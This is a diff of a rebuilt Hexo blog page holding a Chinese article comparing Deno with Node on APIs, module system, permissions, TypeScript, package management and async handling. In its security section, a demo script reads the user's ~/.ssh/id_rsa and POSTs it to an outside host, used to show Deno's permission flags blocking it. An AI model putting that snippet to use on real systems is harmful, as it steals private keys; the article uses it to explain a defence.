@@ -19,7 +19,6 @@ Deno
 
 
 
-
 API 引用方式
 模块导入
 全局对象
@@ -27,7 +26,7 @@ API 引用方式
 
 模块系统
 CommonJS &amp;amp; 新版 node 实验性 ES Module
-ES ,"> 
+ES M,"> 
     <meta name="author" content="张白告丶"> 
     <link rel="alternative" href="atom.xml" title="默默默默燃" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -53,7 +52,7 @@ ES ,">
     
 <link rel="stylesheet" href="/css/ball-atom.min.css">
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 5.1.1"></head>
 
 
 <body class="loading">
@@ -160,80 +159,74 @@ ES ,">
 <thead>
 <tr>
 <th>不同点</th>
-<th style="text-align:right">Node</th>
-<th style="text-align:center">Deno</th>
+<th align="right">Node</th>
+<th align="center">Deno</th>
 </tr>
 </thead>
-<tbody>
-<tr>
+<tbody><tr>
 <td>API 引用方式</td>
-<td style="text-align:right">模块导入</td>
-<td style="text-align:center">全局对象</td>
+<td align="right">模块导入</td>
+<td align="center">全局对象</td>
 </tr>
 <tr>
 <td>模块系统</td>
-<td style="text-align:right">CommonJS &amp; 新版 node 实验性 ES Module</td>
-<td style="text-align:center">ES Module 浏览器实现</td>
+<td align="right">CommonJS &amp; 新版 node 实验性 ES Module</td>
+<td align="center">ES Module 浏览器实现</td>
 </tr>
 <tr>
 <td>安全</td>
-<td style="text-align:right">无安全限制</td>
-<td style="text-align:center">默认安全</td>
+<td align="right">无安全限制</td>
+<td align="center">默认安全</td>
 </tr>
 <tr>
 <td>Typescript</td>
-<td style="text-align:right">第三方，如通过 ts-node 支持</td>
-<td style="text-align:center">原生支持</td>
+<td align="right">第三方，如通过 ts-node 支持</td>
+<td align="center">原生支持</td>
 </tr>
 <tr>
 <td>包管理</td>
-<td style="text-align:right">npm + node_modules</td>
-<td style="text-align:center">原生支持</td>
+<td align="right">npm + node_modules</td>
+<td align="center">原生支持</td>
 </tr>
 <tr>
 <td>异步操作</td>
-<td style="text-align:right">回调</td>
-<td style="text-align:center">Promise</td>
+<td align="right">回调</td>
+<td align="center">Promise</td>
 </tr>
 <tr>
 <td>包分发</td>
-<td style="text-align:right">中心化 npmjs.com</td>
-<td style="text-align:center">去中心化 import url</td>
+<td align="right">中心化 npmjs.com</td>
+<td align="center">去中心化 import url</td>
 </tr>
 <tr>
 <td>入口</td>
-<td style="text-align:right">package.json 配置</td>
-<td style="text-align:center">import url 直接引入</td>
+<td align="right">package.json 配置</td>
+<td align="center">import url 直接引入</td>
 </tr>
 <tr>
 <td>打包、测试、格式化</td>
-<td style="text-align:right">第三方如 eslint、gulp、webpack、babel 等</td>
-<td style="text-align:center">原生支持</td>
+<td align="right">第三方如 eslint、gulp、webpack、babel 等</td>
+<td align="center">原生支持</td>
 </tr>
-</tbody>
-</table>
+</tbody></table>
 <h2 id="1-内置-API-引用方式不同"><a href="#1-内置-API-引用方式不同" class="headerlink" title="1.内置 API 引用方式不同"></a>1.内置 API 引用方式不同</h2><p><strong>node 模块导入</strong></p>
 <p>node 内置 API 通过模块导入的方式引用，例如：</p>
 <pre><code class="js">const fs = require(&quot;fs&quot;);
-fs.readFileSync(&quot;./data.txt&quot;);
-</code></pre>
+fs.readFileSync(&quot;./data.txt&quot;);</code></pre>
 <p><strong>deno 全局对象</strong></p>
 <p>而 deno 则是一个全局对象 Deno 的属性和方法：</p>
 <pre><code class="js">Deno.readFileSync(&quot;./data.txt&quot;);
-具体 deno 有哪些方法，我们可以通过 repl 看一下：
-</code></pre>
-<pre><code class="js">deno # 或 deno repl
-</code></pre>
+具体 deno 有哪些方法，我们可以通过 repl 看一下：</code></pre>
+<pre><code class="js">deno # 或 deno repl</code></pre>
 <p>进入 <code>repl</code> 后，输入 Deno 回车，我们可以看到：</p>
-<pre><code class="json">{
+<pre><code class="json">&#123;
  Buffer: [Function: Buffer],
  readAll: [AsyncFunction: readAll],
  readAllSync: [Function: readAllSync],
  writeAll: [AsyncFunction: writeAll],
  writeAllSync: [Function: writeAllSync],
  # .....
-}
-</code></pre>
+&#125;</code></pre>
 <p>这种处理的方式好处是<strong>简单、方便</strong>，坏处是<strong>没有分类</strong>，想查找忘记的 API 比较困难。总体来说见仁见智。</p>
 <h2 id="2-模块系统"><a href="#2-模块系统" class="headerlink" title="2.模块系统"></a>2.模块系统</h2><p>我们再来看一下模块系统，这也是 deno 和 node <strong>差别最大的地方</strong>，同样也是 deno 和 node 不兼容的地方。</p>
 <p><strong>node CommonJS 规范</strong><br>我们都知道 node 采用的是 CommonJS 规范，而 deno 则是采用的 ES Module 的浏览器实现，那么我们首先来认识一下：</p>
@@ -253,18 +246,16 @@ fs.readFileSync(&quot;./data.txt&quot;);
     import bar from &quot;bar/index.js&quot;;
     import zoo from &quot;./index&quot;; // 没有 .js 后缀
   &lt;/script&gt;
-&lt;/body&gt;
-</code></pre>
+&lt;/body&gt;</code></pre>
 <p><strong>deno 的模块规范</strong><br>deno 完全遵循 es module 浏览器实现，所以 deno 也是如此：</p>
 <pre><code class="js">// 支持
 import * as fs from &quot;https://deno.land/std/fs/mod.ts&quot;;
-import { deepCopy } from &quot;./deepCopy.js&quot;;
+import &#123; deepCopy &#125; from &quot;./deepCopy.js&quot;;
 import foo from &quot;/foo.ts&quot;;
 
 // 不支持
 import foo from &quot;foo.ts&quot;;
-import bar from &quot;./bar&quot;; // 必须指定扩展名\
-</code></pre>
+import bar from &quot;./bar&quot;; // 必须指定扩展名\</code></pre>
 <p>我们发现其和我们平常在 webpack 或者 ts 使用 es module 最大的不同：</p>
 <ul>
 <li><p>可以通过 import url 直接引用线上资源；</p>
@@ -285,35 +276,30 @@ let rsa = Deno.readFileSync(Deno.dir(&quot;home&quot;) + &quot;/.ssh/id_rsa&quot
 
 rsa = new TextDecoder().decode(rsa);
 
-fetch(&quot;http://jsonplaceholder.typicode.com/posts/1&quot;, {
+fetch(&quot;http://jsonplaceholder.typicode.com/posts/1&quot;, &#123;
   method: &quot;POST&quot;,
   body: JSON.stringify(rsa)
-})
+&#125;)
   .then((res) =&gt; res.json())
   .then((res) =&gt; console.log(&quot;密钥发送成功，嘿嘿嘿😜&quot;));
 
-console.log(&quot;start breakwall...&quot;);
-</code></pre>
+console.log(&quot;start breakwall...&quot;);</code></pre>
 <blockquote>
 <p>PS: –unstable 是由于 Deno.dir API 不稳定</p>
 </blockquote>
-<pre><code class="js"> deno run --unstable index.js
-</code></pre>
+<pre><code class="js"> deno run --unstable index.js</code></pre>
 <p>我们将会得到如下报错信息：</p>
 <pre><code class="js">&gt; deno run --unstable  index.js
 error: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag
-    ...
-</code></pre>
+    ...</code></pre>
 <p>意思就是权限异常，需要访问环境变量，需要加上 <code>--allow-env</code>，我们加上这个参数再试一下。</p>
 <pre><code class="js"> deno run --unstable --allow-env index.js
 error: Uncaught PermissionDenied: read access to &quot;/Users/zhangchaojie/.ssh/id_rsa&quot;, run again with the --allow-read flag
-    ...
-</code></pre>
+    ...</code></pre>
 <p>如此反复，还需加上 <code>--allow-read</code>、<code>--allow-net</code> ，最终的结果是：</p>
 <pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net  index.js
 start breakwall...
-密钥发送成功，嘿嘿嘿😜
-</code></pre>
+密钥发送成功，嘿嘿嘿😜</code></pre>
 <p>经过一番折腾，总算是发送成功了，要想盗取密钥实属不易。</p>
 <p><strong>白名单</strong></p>
 <p>那有人就说了，如果我的应用确实需要访问网络和文件，但是有不想让它访问 .ssh 文件有没有办法？</p>
@@ -323,25 +309,22 @@ start breakwall...
 error: Uncaught PermissionDenied: network access to &quot;http://jsonplaceholder.typicode.com/posts/1&quot;, run again with the --allow-net flag
     at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)
     at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)
-    at async fetch ($deno$/web/fetch.ts:591:27)
-</code></pre>
+    at async fetch ($deno$/web/fetch.ts:591:27)</code></pre>
 <p><strong>简化参数</strong></p>
 <p>如果确认是没问题，或者是自己开发软件时，图个方便，可以直接使用 -A 或 –allow-all 参数允许所有权限：</p>
 <pre><code class="js">&gt; deno -A --unstable index.js
 start breakwall...
-密钥发送成功，嘿嘿嘿😜
-</code></pre>
+密钥发送成功，嘿嘿嘿😜</code></pre>
 <p>安全这方面见仁见智，有人觉得是多余，有人觉得很好用，极大的增强了安全性。如果你属于觉得这个功能多余的，可以 deno run -A xxx 即可。</p>
 <h2 id="4-兼容浏览器-API"><a href="#4-兼容浏览器-API" class="headerlink" title="4.兼容浏览器 API"></a>4.兼容浏览器 API</h2><p>关于为什么，我举个栗子大家就明白了：在设计 node 之处，关于输出函数本来叫 <code>print</code> 之类的，后来有人提议为什么不叫 <code>console.log</code>，ry 觉得挺不错，于是就接纳了意见。</p>
 <p>但是，这个设计并不是刻意为之，而 deno 的设计则可以为之，通过与浏览器 API 保持一致，来减少大家的认知。</p>
 <p><strong>怎么兼容浏览器 API</strong></p>
 <blockquote>
 <p>概念上兼容</p>
-<ul>
-<li>模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；</li>
-</ul>
 </blockquote>
 <ul>
+<li><p>模块系统，从上面介绍看出 deno 是完全遵循浏览器实现的；</p>
+</li>
 <li><p>默认安全，当然也不是自己创造的概念，w3c 早已做出浏览器权限的规定，我们在做小程序的时候尤为明显，需要获取各种权限；</p>
 </li>
 <li><p>对于异步操作返回 Promise；</p>
@@ -365,10 +348,9 @@ let encodedData = btoa(&quot;Hello, world&quot;); // 编码
 let decodedData = atob(encodedData); // 解码
 
 // 微任务
-queueMicrotask(() =&gt; {
+queueMicrotask(() =&gt; &#123;
   console.log(123);
-});
-</code></pre>
+&#125;);</code></pre>
 <blockquote>
 <p>大趋势</p>
 </blockquote>
@@ -383,26 +365,23 @@ error TS2322: Type &#39;123&#39; is not assignable to type &#39;string&#39;.
 ► file:///Users/zhangchaojie/Desktop/index.ts:2:1
 
 2 str = 123
-  ~~~
-</code></pre>
+  ~~~</code></pre>
 <h2 id="6-去-node-modules"><a href="#6-去-node-modules" class="headerlink" title="6.去 node_modules"></a>6.去 node_modules</h2><p>deno 没有 <code>node_modules</code>，那么它是怎么进行包管理的呢？我们先看下面的例子</p>
 <pre><code class="js">// index.js
-import { white, bgRed } from &quot;https://deno.land/std/fmt/colors.ts&quot;;
+import &#123; white, bgRed &#125; from &quot;https://deno.land/std/fmt/colors.ts&quot;;
 
 console.log(bgRed(white(&quot;hello world!&quot;)));
 &gt; deno run index.js
 Download https://deno.land/std/fmt/colors.ts
 Compile https://deno.land/std/fmt/colors.ts
-hello world!
-</code></pre>
+hello world!</code></pre>
 <p>我们看到其有 Download 和 Compile 两个步骤，我们会产生几个疑问：</p>
 <blockquote>
 <p>1、每次执行都要下载吗？</p>
 </blockquote>
 <p>解：我们只需要再执行一次就能明白，不需要每次下载。</p>
 <pre><code class="js">&gt; deno run index.js
-hello world!
-</code></pre>
+hello world!</code></pre>
 <blockquote>
 <p>2、Download 和 Compile 的文件在哪里呢？</p>
 </blockquote>
@@ -414,16 +393,14 @@ info           Show info about cache or info related to source file
 
 # ...
 ENVIRONMENT VARIABLES:
-    DENO_DIR   Set deno&#39;s base directory (defaults to $HOME/.deno)
-</code></pre>
+    DENO_DIR   Set deno&#39;s base directory (defaults to $HOME/.deno)</code></pre>
 <p>deno info 命令展示了依赖关系，类似 package.json。</p>
 <pre><code class="js">&gt; deno info index.js
 local: /Users/zhangchaojie/Desktop/index.js
 type: JavaScript
 deps:
 file:///Users/zhangchaojie/Desktop/index.js
-  └── https://deno.land/std/fmt/colors.ts
-</code></pre>
+  └── https://deno.land/std/fmt/colors.ts</code></pre>
 <p>DENO_DIR 则为实际的安装和编译目录，相当于 node_modules，默认为 $HOME/.deno（命令提示是这样的，但实际需要指定一下环境变量 <code>export DENO_DIR=$HOME/.deno）</code>，我们看一下：</p>
 <pre><code class="js">&gt; tree $HOME/.deno
 /Users/zhangchaojie/.deno
@@ -441,8 +418,7 @@ file:///Users/zhangchaojie/Desktop/index.js
                     ├── colors.ts.js.map
                     └── colors.ts.meta
 
-8 directories, 5 files
-</code></pre>
+8 directories, 5 files</code></pre>
 <blockquote>
 <p>3、没网络了怎么办？</p>
 </blockquote>
@@ -465,22 +441,19 @@ file:///Users/zhangchaojie/Desktop/index.js
 <h2 id="7-标准模块-与-node-API-兼容"><a href="#7-标准模块-与-node-API-兼容" class="headerlink" title="7.标准模块 与 node API 兼容"></a>7.标准模块 与 node API 兼容</h2><p>我们通过第 1 点可以看到，其实 deno 的 API 相对于 node 其实是少一些的，通过其文件大小也能看出来：</p>
 <pre><code class="js">&gt; ll /usr/local/bin/node /Users/zhangchaojie/.local/bin/deno
 -rwxr-xr-x  1   42M   /Users/zhangchaojie/.local/bin/deno
--rwxr-xr-x  1   70M   /usr/local/bin/node
-</code></pre>
+-rwxr-xr-x  1   70M   /usr/local/bin/node</code></pre>
 <p>那这些少的 API 只能自己写或者求助于社区吗？</p>
 <p>deno 对于自身相对于 node 少的和社区中常用的功能，提供了标准模块，其特点是不依赖非标准模块的内容，达到社区内的模块引用最后都收敛于标准模块的效果。例如：</p>
 <pre><code class="js">// 类似 node 中 chalk 包
-import { bgRed, white } from &quot;https://deno.land/std/fmt/colors.ts&quot;;
+import &#123; bgRed, white &#125; from &quot;https://deno.land/std/fmt/colors.ts&quot;;
 
 // 类似 node 中的 uuid 包
-import { v4 } from &quot;https://deno.land/std/uuid/mod.ts&quot;;
-</code></pre>
+import &#123; v4 &#125; from &quot;https://deno.land/std/uuid/mod.ts&quot;;</code></pre>
 <p>同时为了对 node 用户友好，提供了 node API 的兼容</p>
 <pre><code class="js">import * as path from &quot;https://deno.land/std/node/path.ts&quot;;
 import * as fs from &quot;https://deno.land/std/node/fs.ts&quot;;
 
-console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))
-</code></pre>
+console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))</code></pre>
 <p>所以，大家在为 deno 社区做贡献的时候，首先要看一下标准模块有没有提供类似的功能，如果已经提供了可以进行引用。</p>
 <h2 id="8-异步操作"><a href="#8-异步操作" class="headerlink" title="8.异步操作"></a>8.异步操作</h2><blockquote>
 <p>根据 ry 自己是说法，在设计 node 是有人提议 Promise 处理回调，但是他没听，用他自己的话说就是愚蠢的拒绝了。</p>
@@ -488,30 +461,27 @@ console.log(path.resolve(&#39;./&#39;, &#39;./test&#39;))
 <p><strong>node 用回调的方式处理异步操作、deno 则选择用 Promise</strong></p>
 <pre><code class="js">// node 方式
 const fs = require(&quot;fs&quot;);
-fs.readFile(&quot;./data.txt&quot;, (err, data) =&gt; {
+fs.readFile(&quot;./data.txt&quot;, (err, data) =&gt; &#123;
   if (err) throw err;
   console.log(data);
-});
-</code></pre>
+&#125;);</code></pre>
 <p>另外 deno 支持 top-level-await，所以以上读取文件的代码可以为：</p>
 <pre><code class="js">// deno 方式
 const data = await Deno.readFile(&quot;./data.txt&quot;);
-console.log(data);
-</code></pre>
+console.log(data);</code></pre>
 <p>node 关于这方面也在一直改进，例如社区上很多 <code>promisify</code> 解决方案，通过包裹一层函数，实现目的。例如：</p>
 <pre><code class="js">// node API promisify
-const { promisify } = require(&quot;es6-promisify&quot;);
+const &#123; promisify &#125; = require(&quot;es6-promisify&quot;);
 const fs = require(&quot;fs&quot;);
 
 // 没有 top-level-await，只能包一层
-async function main() {
+async function main() &#123;
   const readFile = promisify(fs.readFile);
   const data = await readFile(&quot;./data.txt&quot;);
   console.log(data);
-}
+&#125;
 
-main();
-</code></pre>
+main();</code></pre>
 <h2 id="9-单文件分发"><a href="#9-单文件分发" class="headerlink" title="9.单文件分发"></a>9.单文件分发</h2><p>我们知道 npm 包必须有 <code>package.json</code> 文件，里面不仅需要指明 main 或 module 或 browser 等字段来标明入口文件，还需要指明 <code>name 、license 、description</code> 等字段来说明这个包。</p>
 <p>ry 觉得这些字段扰乱了开发者的视听，所以在 deno 中，其模块不需要任何配置文件，直接是 import url 的形式。</p>
 <h2 id="10-去中心化仓库"><a href="#10-去中心化仓库" class="headerlink" title="10.去中心化仓库"></a>10.去中心化仓库</h2><p>对于 <code>www.npmjs.com</code> 我们肯定都不陌生，它是推动 node 蓬勃发展的重要支点。但作者认为它是中心化仓库，违背了互联网去中心化原则。</p>
@@ -533,7 +503,7 @@ main();
 </ul>
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>就像小时候一直幻想的炸弹始终没能炸了学校，技（轮）术（子）的进（制）步（造）一直也未停止过。不论我们学的动或者学不动，技术就在那里，不以人的意志为转移。</p>
 <p>至于 deno 能不能火，我个人觉得起码一两年内不会有太大反响，之后和 node 的关系有可能像 Vue 和 react，有人喜欢用 deno，觉得比 node 好一万倍，有人则喜欢 node ，觉得 node 还能再战 500 年。至于最终学不学还看自己。</p>
-<p><a href="https://juejin.im/post/5ebcabb2e51d454da74185a9" target="_blank" rel="noopener">20 分钟入门 deno</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.im/post/5ebcabb2e51d454da74185a9">20 分钟入门 deno</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -558,7 +528,7 @@ main();
         data-r='blog-comments'
         data-o='TriDiamond'
         data-a='TriDiamond'
-        data-d='undefined'
+        data-d=''
     >Comments</div>
 
 
@@ -592,7 +562,7 @@ main();
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Deno-VS-Node"><span class="toc-number">1.</span> <span class="toc-text">Deno VS Node</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-内置-API-引用方式不同"><span class="toc-number">1.1.</span> <span class="toc-text">1.内置 API 引用方式不同</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-模块系统"><span class="toc-number">1.2.</span> <span class="toc-text">2.模块系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-安全"><span class="toc-number">1.3.</span> <span class="toc-text">3.安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-兼容浏览器-API"><span class="toc-number">1.4.</span> <span class="toc-text">4.兼容浏览器 API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-支持-Typescript"><span class="toc-number">1.5.</span> <span class="toc-text">5.支持 Typescript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-去-node-modules"><span class="toc-number">1.6.</span> <span class="toc-text">6.去 node_modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-标准模块-与-node-API-兼容"><span class="toc-number">1.7.</span> <span class="toc-text">7.标准模块 与 node API 兼容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-异步操作"><span class="toc-number">1.8.</span> <span class="toc-text">8.异步操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-单文件分发"><span class="toc-number">1.9.</span> <span class="toc-text">9.单文件分发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-去中心化仓库"><span class="toc-number">1.10.</span> <span class="toc-text">10.去中心化仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-去开发依赖"><span class="toc-number">1.11.</span> <span class="toc-text">11.去开发依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">1.12.</span> <span class="toc-text">后记</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Deno-VS-Node"><span class="toc-number">1.</span> <span class="toc-text">Deno VS Node</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%86%85%E7%BD%AE-API-%E5%BC%95%E7%94%A8%E6%96%B9%E5%BC%8F%E4%B8%8D%E5%90%8C"><span class="toc-number">1.1.</span> <span class="toc-text">1.内置 API 引用方式不同</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.2.</span> <span class="toc-text">2.模块系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%85%BC%E5%AE%B9%E6%B5%8F%E8%A7%88%E5%99%A8-API"><span class="toc-number">1.4.</span> <span class="toc-text">4.兼容浏览器 API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%94%AF%E6%8C%81-Typescript"><span class="toc-number">1.5.</span> <span class="toc-text">5.支持 Typescript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%8E%BB-node-modules"><span class="toc-number">1.6.</span> <span class="toc-text">6.去 node_modules</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%A0%87%E5%87%86%E6%A8%A1%E5%9D%97-%E4%B8%8E-node-API-%E5%85%BC%E5%AE%B9"><span class="toc-number">1.7.</span> <span class="toc-text">7.标准模块 与 node API 兼容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">1.8.</span> <span class="toc-text">8.异步操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%8D%95%E6%96%87%E4%BB%B6%E5%88%86%E5%8F%91"><span class="toc-number">1.9.</span> <span class="toc-text">9.单文件分发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E4%BB%93%E5%BA%93"><span class="toc-number">1.10.</span> <span class="toc-text">10.去中心化仓库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-%E5%8E%BB%E5%BC%80%E5%8F%91%E4%BE%9D%E8%B5%96"><span class="toc-number">1.11.</span> <span class="toc-text">11.去开发依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">1.12.</span> <span class="toc-text">后记</span></a></li></ol></li></ol>
                 </div>
             </div>
             
